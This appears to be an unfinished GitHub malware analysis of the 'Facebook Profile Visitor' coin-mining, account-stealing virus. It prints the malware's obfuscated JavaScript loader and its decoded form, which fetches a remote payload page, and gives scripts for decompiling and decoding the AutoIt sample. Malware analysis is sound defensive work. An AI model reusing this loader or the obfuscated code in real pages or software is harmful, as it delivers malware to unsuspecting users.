# How Facebook Profile Visitor virus works?
## What is it?
<i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook since 03/2020 until now.

## What does it do?
It mines coin (particularly XMRIG) on your computer and stoles your Facebook account to spread the virus.

## Example?
![Vietnamese version of the virus](https://user-images.githubusercontent.com/68118236/145680558-47cabfdf-95be-4eae-b13b-7e7fc62a0a43.png)
<br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app"

## VirusTotal and Any.run
[VirusTotal](https://www.virustotal.com/gui/file/f479135d5db8e2f6dff59252b8e51ebd9414a226df908f994376415c20b9446d/detection)
[Any.run](https://app.any.run/tasks/c13f22e8-be22-4ea2-b350-a97efcfd948e)

## How does it work?
<b>Be careful when clicking any of these links!!!</b>

### 1) The link in the Facebook post - how it spread
As you can see in the picture above, the post has the text said "Hello, you can know who visited your profile with the Profile Visitor app", and then the link, and then some pictures of people who visited the person who post's profile (I don't know if that is the real information or not).
<br> The link come in the form of `https://is.gd/` and then some id, for example `dZCN4W`. After some search I found that is.gd is an URL shortener service (but it might be built only for this purpose of spreading the virus onto Facebook)
<br> After clicking the link, it redirects you to the Google Storage API URL.

### 2) Google Storage API
Then you come to some links like `https://storage.googleapis.com/544707c173427ea279a99cbb1451cccb/913820487?ref=facebook&cid=b4a011cf-effb-fc9b-d533-ecc9323874a9&zip=ProfileVisitors%20v5.1.zip&exe=visitors.facebook.com`
<br> It is a REAL data stored on Google Storage on Google Cloud, and if you click view source, the following things comes:
```html

<!DOCTYPE html>
<html translate="no" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <script type="text/javascript">
      var bcddet = this;
var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
var tvswn = "";
var rtpbo = 7;
var cvzkg = "length";
for(czzgv=0;czzgv<gxcei[cvzkg];czzgv++){
	var odygqq = "String";
	var unyrua = "fromCharCode";
	tvswn += bcddet[odygqq][unyrua](gxcei[czzgv]+rtpbo);
}
var bpvsum = "eval";
bcddet[bpvsum](tvswn);

    </script>
  </head>
  <body></body>
</html>
```
<br> You can also view the file `web.html` in this repo.
<br> The HTML code is mostly encoded in the array `gxcei`. This trick is often used to encode the source code that creator does not want clients to view. After cleaning and decoding, it becomes:
```html
<!DOCTYPE html>
<html translate="no" dir="ltr">
<head>
  <meta charset="utf-8">
  <title></title>
  <script type="text/javascript">
  var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
  var tvswn = "";
  for(counter=0;counter<gxcei.length;counter++){
        tvswn += this.String.fromCharCode(gxcei[counter]+7);
  }
  this.eval(tvswn); // Execute the code

  </script>
</head>
<body>
</body>
</html>
```
<br> Please note that I have added some comments in the code.
<br>The array is decoded as the following Javascript code:
```javascript
fetch("https://okim.me/blob.php?time="+Date.now())
function(response)
{
	return response.text();
}
function(data)
{
	document.write(data);
};
```
<br> So it actually fetch another page, in this case `https://okim.me/blob.php?time=` followed by the current time. The page downloads a zip file into your computer.
<br>![The downloader](https://user-images.githubusercontent.com/68118236/145681336-c1cd118a-ca60-4af1-abd1-189b239f2935.png)
<br> Again, Vietnamese text said "758 download counts" and "The password is 3865". They actually use Google Translate API to translate this, the original things was in English.
<br> You can get the source of it if you want to, see `web` folder in this repo.
<br> <b>Again, some notes: The page sometimes might be blank when Cloudflare block the access of the client (I don't know why)</b>

### 3) The zip
After extract the zip with the provided password, it only has one file named `visitor.facebook.com`. It looks like an old 16-bit app, but actually it is an 64-bit app written in AutoIt scripting language. See VT for more information.
<br> In case you don't know, AutoIt is a interpreter language, which means it has to be phrased and executed at runtime. So, we can get the source code from it easily.

### 4) Decompile
<br> Refer to [VinCSS post](https://blog.vincss.net/2020/02/phuong-phap-trich-xuat-malicious-autoit-script.html), I decompiled it by:
<br> - Use the script below to convert the application to 32-bit app so Exe2Aut can decompile it:
```python
import sys

if len(sys.argv) != 3:
        print "Usage: python.exe autoit64to32.py <AutoItSC.bin> <sample>"
        sys.exit(1)
else:
        try:
                print 'Processing: ' + sys.argv[2]
                print '- Reading ' + sys.argv[1]
                autoitsc_content = open(sys.argv[1], 'rb').read()

                print '- Reading ' + sys.argv[2]
                sample_content  = open(sys.argv[2], 'rb').read()
                
                print '- Looking for the script'
                offset = sample_content.find(b'\xA3\x48\x4B\xBE\x98\x6C\x4A\xA9\x99\x4C\x53\x0A\x86\xD6\x48\x7D')
                if offset != -1:
                        print '- Script found at: 0x%x' % offset
                        sample_content = sample_content[offset:]

                        pe32_filename = sys.argv[2] + '.a32b.exe'
                        print '- Creating 32-bit version: ' + pe32_filename

                        open(pe32_filename, 'wb').write(autoitsc_content + sample_content)
                else:
                        print '- Script not found !'
        except Exception as e:
                print repr(e)
```
<br> - Decompile the source by drag it to Exe2Aut (You can download this online)
<br> - Get the source. The source code is protected by using the obfuscate technique, so it has 17678 lines!

### 5) De-obfuscate
<br> How? If you look at `fb.original.au3`, and scroll down at line 17334, there will be a call to the function `yuqcv()`:
![Main function](https://user-images.githubusercontent.com/68118236/145681966-32b605be-6e64-498d-a569-811e18ef7016.png)
<br> That is the main function! Why? If it is not, the call to the function must be inside another function. Also, all the file are all define of variables and functions, no actually executed code outside the function scope.
<br> Let take a look at it:
```autoit
Func yuqcv()
	$kkdygt = False
	For $i = $hxgunslnvoqp To $loptakx[apdpszx()]
		$jacjdnyx = $dftwmmefiev($uhqytcys($qojrpnaezkx), $loptakx[$i])
		If $jacjdnyx <> $fatiftckytkx Then
			$kkdygt = True
			ExitLoop
		EndIf
	Next
	If $kkdygt = False Then
		$tycocfgddh(nxlara($hauunuxlni & bbrfvej() & "" & ">(hu" & "" & cenlmetaefbs() & "" & scvbk() & $akneqgiits & $hhwbnd[91] & "" & $tsaabo))
		Exit
	Else
		Global $ifhbok = $bretzrnes(huslz("" & $xjxylhdbgpik))
		If $ifhbok = "" Then
			$ifhbok = robuh("" & "Um2" & "" & qbobehimrx())
		EndIf
		umwlcnpqy()
	EndIf
EndFunc
```
The variable `$kkdygt` is defined as False, `$hxgunslnvoqp` as `Local $hxgunslnvoqp = 331 / 331` so equal to 1, `apdpszx()` has the return of `Return 376 - 376` so equal to 0.
<br> But `$loptakx` is another story:
```autoit
$loptakx = $jtpebhivaeht(cxpclkhaarq("" & $wgakprflcmc & "" & $tgcbodidamzf & nebxzuhkbw() & "" & $hhwbnd[87] & "" & $hhwbnd[88] & "" & $hhwbnd[89] & "puV2d" & "" & $hhwbnd[90] & "" & "VB" & $cikmfzzgzvs & jeqcvmwvxxt() & gjyztaed() & "K" & xaheir() & $cnzvfbpz), mljbow("" & hcryswybbj()))
```
<br> `$jtpebhivaeht` is defined as `Execute`, `cxpclkhaarq` is the function `wanzeppkxbwu`:
```autoit
Func wanzeppkxbwu($jpoepgca)
	$qwyarxno = $hhwbnd[30] & "" & $eambenzcvdvn & "" & "t" & "" & $hhwbnd[31] & "" & $hhwbnd[32] & tfxpke() & "" & $hhwbnd[33] & $efsrh & dnvwvcjqt() & "" & sdrkqzqfrt() & "?g" & $edqmzgye & "" & $hhwbnd[34] & "" & $hhwbnd[35] & "N" & "" & "Vn" & "" & $hhwbnd[36] & "._" & "u#" & "" & $hhwbnd[37] & "" & $sbagzydue & $jzzfs & "" & $sngvqrwyrtnf & "" & ghneinwsczwn() & "a" & skjmysrcxuce() & "" & "&" & mgekiaoodq() & $yoqaxkf & $bwfzm & "" & $uuwqp & "" & $ahoipgdmonw & "" & "{0" & $xsqxreif & "" & "2" & "[" & "" & $ztagsubbllpf & ydkvqnum() & wnyebdjkkx() & "" & "GW)" & "" & hkdfwjeedtsk() & $sfiaun & "5]" & rxqwrwgdy() & "" & "f" & ybjzm() & $stgdo & "" & "<3" & "" & "m" & "" & "q" & ">" & kadnznhdlejk() & "8j" & $kbiqgxhyj & lpxty() & "" & bxglmgqytl() & "Z" & "" & $mrlijjcbr & "" & $hhwbnd[38] & "" & $hhwbnd[39]
	$wekfomhxyqf = $gevjrziwuj & liyimzhuyjb() & "" & "D" & "" & yjwrfhucd() & "=Y" & "Z)" & $eebpoy & xcrytctff() & jpleymguxhlq() & "" & mumrojklbr() & "g" & "" & $yxjywaja & "" & $hhwbnd[40] & "" & wexxtm() & $hhwbnd[41] & "" & $hhwbnd[42] & "" & "P" & nbfmdky() & "" & vgsnxik() & "o" & "" & $hhwbnd[43] & "" & $hhwbnd[44] & "v" & "e" & "." & "" & "0" & $copbkndbx & "" & $hhwbnd[45] & $hhwbnd[46] & "" & jtqmalf() & amgwihw() & $hhwbnd[47] & "" & twttad() & "" & "R&" & $hhwbnd[48] & "<" & "" & dzcaeo() & "K" & "" & $hhwbnd[49] & "" & "c" & "" & "+p" & $hhdgedvlvkl & tlgvjkdl() & "@" & qayvoyyp() & "" & mjopojtg() & ozirixnbzbmx() & sprlin() & $hmpexu & $mbljdmws & $hhwbnd[50] & "" & $hhwbnd[51] & "N" & "9" & $hhwbnd[52] & uhlldcg() & tjqlvowz() & "" & tcwieupeopr() & $hhwbnd[53] & "1" & "" & $hhwbnd[54] & $hhwbnd[55] & $uuocjrnuht & "" & $hhwbnd[56] & "" & tokwbfnli() & ":" & $hhwbnd[57]
	Local $tcmtaq = Execute($hhwbnd[58] & $hhwbnd[59] & "" & $hhwbnd[60] & hnrnueyd() & alabpxdb() & $qatcw & $hgdwcntsjcvo & guvuenf())
	Local $tpazve = Execute("" & "St" & "" & sxscidr() & $hpookkbivcrw & "" & phfdpuycr() & "" & "i" & "" & $hhwbnd[61])
	Local $mjquv = Execute(cxxudtshl() & "" & oqpfl() & "" & $nfbyopcmsbfj & qoklfhjskts() & $hhwbnd[62] & $hhwbnd[63])
	Local $bmroqxms
	$ibuiclergcj = $mjquv($jpoepgca)
	For $xwrvti = 0 + 0 To $ibuiclergcj
		$tejvw = $tpazve($jpoepgca, $xwrvti, $hhwbnd[27])
		$glopiobyw = $tcmtaq($qwyarxno, $tejvw, $hhwbnd[28])
		$rdganmja = $tpazve($wekfomhxyqf, $glopiobyw, $hhwbnd[29])
		$bmroqxms &= $rdganmja
	Next
	Return $bmroqxms
EndFunc
```
<br> I have wrote a Python script for this, basically replace the whole function `wanzeppkxbwu`. It do both work of variable replacer and decoder:
```python
# Decode the string in fb.au3

import sys

a = open(sys.argv[1], "r")
code = a.read().split("\n")
a.close()

d = [0, 500.0, 0.0, 200, 4, 5, 0, 2.0, 3, 0, 0, 1.0, 1, 0, 1, 2, 0, 0, 0.0, 0.0, 1.0, 2.0, 3, 4, 1, 0.0, 3, 1, 1, 1, '+', '-,', ': ', ';R', '\\', 'K', '^', 'E', '(', 'k', ' ', '^', '|M', 'n', 'a', 'XS', 'q', 'J', '}', '{', 'U', 'd', 'A', '_', '\\', '8T', 'k', '/', 'S', 't', 'r', 'd', 'e', 'n', '>', 'J', 'p>Mx', '}p', 'E', '#', 'g=#', 'J>K', 'Q', 'hu', '>p', 'J', 'p2', '^', '=t', 'J|', '5', 'p', 'K', '#', 'Tp?', '\\nE#', 'E', '>p', 'KVB', 'x$', 'E[', 'm', '?x>(', 'um', '^', '>*', '#', 'Lx2', '=#', 'C', '5u', '(=*', 'E', '#', '|6', ')w_hKpE', 'Qx', '#', '6>>2', 'p', 'C>', '\\S', '6', 'ug', 'H+', 'E', '>M$hC', '>', '*', '$', 'gp', 'S', 'C', '>', 'K', 'GS', 'ix', '<', 'O3wu', 'p*>3pE', 'KG', '+', '|Kx', '>M', '>', '}', 'u', '*p>', 'pC', 'p', 'g', '-H', '>M', '$p', 'G', 'h^', '+I', 'H', 'h', 'p', 'p', 'E', 'p', '$S', 'n', '2', '{PH', '*p', 'p', 'K', 'p', 'K', '*x', '5u', ' T', 'pa', '9', 'E$', '5#', '<>M', '>', 'L*', ' ', '>', '>9', '*', '9', 'p', '22kd', 'gx#T', '262', 'U?', '<>M', '*p', 'K', 'GS9#Lx', '$hC', 'L* T', 'x>p', '3{', '2', '=#', '*', '$', '}', 'J', 'p', 'p', 'p', '*', 'Z', 'ET', 'p', 'j', 'Cx', 'd', 'U', '#iE', '\\', 'EuE', '\\', '{', ' m', 'gw', 'm', 'w', 'e', 'i', 'Ku', 'd', '$', 'pCp#$', 'x>[', 'Ed', '>', 'p?p', 'dd', '6', 'phu', '[', '^Ku|', '*iEx>', 'hdu', 'x', '#', '$', '/', 'Kum', '|6Ku', 'z', 'p\\z', 'E|>#\\', 'p>', '2Ku', '>', '$E|', '#', '>\\Cx', 'p', '\\', '#(', 'J', 'd', 'dp>', 'j', 'Tp?', '\\zu', 'z', '\\', '(', '*', '#[\\z', '\\', '(', 'uK', '*', '$pd', 'p', "'m", '$p', '#[', 'p>4h', 'zE', '|>#\\', 'dA', '6', "$'m(", '#(7', '*', "pK*'", '$', '>', 'p', 'z', 'E', '|', "u#p'2($", '|', '6xd$', 'U', '[u#p', "'", '2', "p'm", 'j', '\\', 'u', '>\\', 'Cxdp\\z', '*', '>', '\\', 'K\\#', '(J', 'n', '}pgiKx', '}', 'p', 'd', '@', 'i)}', 't', 'uQ', '*', '9', 'pK', 'x|xp*', '*', 'Tp?p', 'h', '#>P', 'u#*', 'Tp', 'v', 'K', 'P', 'g', 'j', 'uC', 'u#j^', 'udx', '*jJ', '>', 'p', 'm', 'Ewd', 'Q', '*', '*', 'pK', 't', 'dp', '[Q', 'Kp', 'U', 'h', '9K', 'u', 'Kud', 'J', 'KBx|p', '*', 'EK', 'p', 'J>E#', 'w', 'd', 'pO', 'x', 'Edd', '3{', 'v', ':', 'p', 'udJ', 'K', '|p*', 'jJ', '*j', '^E', 'Emp', 'p', 'x', 'K', '$E', '^', 'dp', 'w', 'dp5', 'xCx', 'E', 'xu', 'J', 'M', 'Unjh9', 'u', '9', 'J', 'x|p', '|9', '3', 'p', 'j', 'QE', 'p', 'C>', 'j', 'i', 'u', 'pK', '#', 'Ji', '= ', 'U', 'J6', 'dd', 'U', 'p', 'z', 'u', 'z', 'dE', 'xu', 'x#', 'z', 'C', '4', '9>', '#', '#', '>Ku', '22tE', 'm', 'tx', 'u', 'I', '>', 'u2h', 'u', 'C>', '=', 'Y', '\\', 'jn', '|K', '>', '2', 'duK', 'W9x', 'E9', 'Y', 'O', '>', 'u', 'p', 'h', 'p', '>pJ', '6u', 'm', 'u#\\', 'dx#', 'Y', 'CpE>', 'u#>', 'p$\\z', '?', '>p', '#', 'x', 'u', 's.e', '2$E', '>p', 'e', 'p', '92$', '*', 'uC>Q', 'K', '2U', '*', 'p', 'KB', 'x|pT', 'p', 'hd', 'u', 'O', 'OxK*', 'O', 'pOx#$', 'K', '#g', 'x', '#g}pgU?2', 'f', 'r', '(', 'ljV', '/', '*H', 'x', 'p', 'C', 'jjjj/', 'R', 'GG/(fNjT', 'j', 'T', 'N', 'jk', '<', 'kj', 'jR', 'j', '6', 'kjj']

def decode_to_code(p):
    string1 = "+St-,: H;R=weX?gC\KNVn^._u#EBpTb/UsJahi9'&Dr}Fclz{0|12[yIQ6O@GW)x7$5]4fL*<3mq>A8joMPYdZv(k"
    string2 = ",'DB=YZ)>]Ib4#xgf r^|MP6jonave.0?EXSqCWu;J3*R&}<-K{c+py5@whFG(QOiUdN9A[zs$Hm2t_1\8TVkl7L:/"
    returnvalue = ""
    for i in range(0, len(p)):
        l = len(string1.split(p[i:i+1])[0])
        returnvalue += string2[l:l+1]
    return returnvalue

def decode_string(b, c, d):
    c = c.split(" & ")

    for i in range(0, len(c)):
        if '"' in c[i]:
            c[i] = c[i][1:-1]

    for i in range(0, len(c)):
        if ("$" in c[i]) and (not ("[" in c[i] and "]" in c[i])):
            for j in b:
                if (c[i] + " = ") in j:
                    c[i] = j.split(" = ")[1]

    for i in range(0, len(c)):
        if ("$hhwbnd[" in c[i]):
            c[i] = d[int(c[i].split("[")[1][:-1])]

    for i in range(0, len(c)):
        if ("(" in c[i]) and (")" in c[i]):
            name = c[i].split("()")[0]
            for j in range(0, len(b)):
                if ("Func " + name + "()") in b[j]:
                    for k in range(j+1, len(b)):
                        if "EndFunc" in b[k]:
                            c[i] = b[k-1].split(" ")[1]
                            break
                    break

    for i in range(0, len(c)):
        if '"' in c[i]:
            c[i] = c[i][1:-1]
    
    return decode_to_code(''.join(c))

while True:
    print("Enter the string you want to decode: ")
    i = input()
    print("The output is " + decode_string(code, i, d))
```
<br> In case you still want to know how the function looks like in AutoIt:
```autoit
Func wanzeppkxbwu($p)
	$string1 = "+St-,: H;R=weX?gC\KNVn^._u#EBpTb/UsJahi9'&Dr}Fclz{0|12[yIQ6O@GW)x7$5]4fL*<3mq>A8joMPYdZv(k"
	$string2 = ",'DB=YZ)>]Ib4#xgf r^|MP6jonave.0?EXSqCWu;J3*R&}<-K{c+py5@whFG(QOiUdN9A[zs$Hm2t_1\8TVkl7L:/"
	Local $returnvalue
	For $counter = 0 To StringLen($p)
		$returnvalue &= StringMid($string2, StringInStr($string1, StringMid($p, $counter, 1), 1), 1)
	Next
	Return $returnvalue
EndFunc
```
You can decode the whole file with it!

### 6) The function series
Back to the main function:
```autoit
Func yuqcv()
	$kkdygt = False
	For $i = $hxgunslnvoqp To $loptakx[apdpszx()]
		$jacjdnyx = $dftwmmefiev($uhqytcys($qojrpnaezkx), $loptakx[$i])
		If $jacjdnyx <> $fatiftckytkx Then
			$kkdygt = True
			ExitLoop
		EndIf
	Next
	If $kkdygt = False Then
		$tycocfgddh(nxlara($hauunuxlni & bbrfvej() & "" & ">(hu" & "" & cenlmetaefbs() & "" & scvbk() & $akneqgiits & $hhwbnd[91] & "" & $tsaabo))
		Exit
	Else
		Global $ifhbok = $bretzrnes(huslz("" & $xjxylhdbgpik))
		If $ifhbok = "" Then
			$ifhbok = robuh("" & "Um2" & "" & qbobehimrx())
		EndIf
		umwlcnpqy()
	EndIf
EndFunc
```
<br> It looks like when decoded (note that I have added some comments and some variables, also rename the variables and functions):
```autoit
$lsrlgh = StringSplit("Start|cmd.exe|Program Manager", "|")
$loptakx = StringSplit("updater|video|play|visitor|app", "|")

Func main() ; Main!!!!! - Check if vaild name
	$flag = False
	; This probably check if the name of the exe file is vaild, then decide to run
	For $i = 1 To $loptakx[0]
		$result = StringInStr(StringLower(@ScriptName), $loptakx[$i])
		If $result <> 0 Then
			$flag = True
			ExitLoop
		EndIf
	Next
	If $flag = False Then
		ConsoleWrite("ExitControlExeName") ; Wow, if the exe name is not vaild, then quit the program :)
										   ; I didn't know why the author do this? Maybe for checking
										   ; if the program is decompiled and then recompiled?
		Exit
	Else
		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows
		If $wintitle = "" Then
			$wintitle = "Empty" ; Why set the windows title to empty??????
		EndIf
		main2() ; Call main2
	EndIf
EndFunc
```
<br> Basically it check if the exe name is vailded, then decide to run or not
<br> Function `main2` looks like:
```autoit
Func main2() ; Run only one instance
	$processpointer = ProcessList(@ScriptName) ; Get the current program process
	For $counter = 1 To $processpointer[0][0] ; Get number of instances of this process
		If $processpointer[$counter][1] <> @AutoItPid Then ; Get pid of processes and compare
			ConsoleWrite("ExitAlreadyRunning") ; Run the virus once
			Exit
		EndIf
	Next
	main3() ; Continue
EndFunc
```
<br> It only allows one instance of the virus to run
<br> Now come to `main3`
```autoit
Func main3() ; Ping server
	$counter = 0
	While $counter = 0
		$counter = Ping("google.com") ; They ping google to check if network available :) - the old trick!
		Sleep(500)
	WEnd
	main4() ; Next!
EndFunc
```
<br> It Ping google to check if internet connection is available - the old trick

# I will continue to write tomorrow! Bye!
